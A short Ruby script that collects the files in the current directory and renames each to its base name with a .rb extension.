def find_files_and_folders(files , directories)
    # Search all files and folders in same path with main.rb
    for i in Dir.entries(Dir.pwd) do
        # If element in path is equal to file add this into files array
        if File.file?(i)
            files.append(i)
        # otherwise add into directories array
        else
            directories.append(i)
        end
    end
end

def convert_files_to_ruby(files)
    # Get file in files 
    for file in files do
        # Split file name to get extension and name of the file
        file_name = file.split('.')
        # Rename the original file (change extension of this file to rb)
        File.rename(Dir.pwd + '/%s' % [file] , Dir.pwd + '/%s.rb' % [file_name[0]])
    end
end

# Store in 2 different arrays 
files , directories = [] , []
find_files_and_folders(files , directories)
convert_files_to_ruby(files)
